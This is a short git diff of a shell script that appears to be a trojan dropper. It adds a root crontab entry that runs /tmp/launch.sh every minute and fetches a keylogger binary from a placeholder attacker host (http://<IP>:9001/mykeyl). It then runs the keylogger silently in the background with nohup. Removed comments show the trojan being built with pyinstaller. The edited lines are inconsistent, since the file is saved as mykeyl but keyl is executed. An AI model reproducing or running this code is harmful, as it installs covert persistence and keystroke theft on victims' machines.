@@ -28,17 +28,7 @@ chmod +x /tmp/killSwitch.sh
 echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
 
 #keyl
-
-wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
+wget -O /tmp/mykeyl http://<IP>:9001/mykeyl
 chmod u+x /tmp/keyl
-
-#TESTING:
-#pyinstaller --onefile --name keyl /home/kali/Desktop/trojan/trojan.py
-#mv /home/kali/Desktop/trojan/dist/keyl /tmp/keyl
-#
-#rm /home/kali/Desktop/trojan/keyl.spec
-#rm -R /home/kali/Desktop/trojan/build
-#rm -R /home/kali/Desktop/trojan/dist
-
 
 nohup /tmp/keyl &> /dev/null &
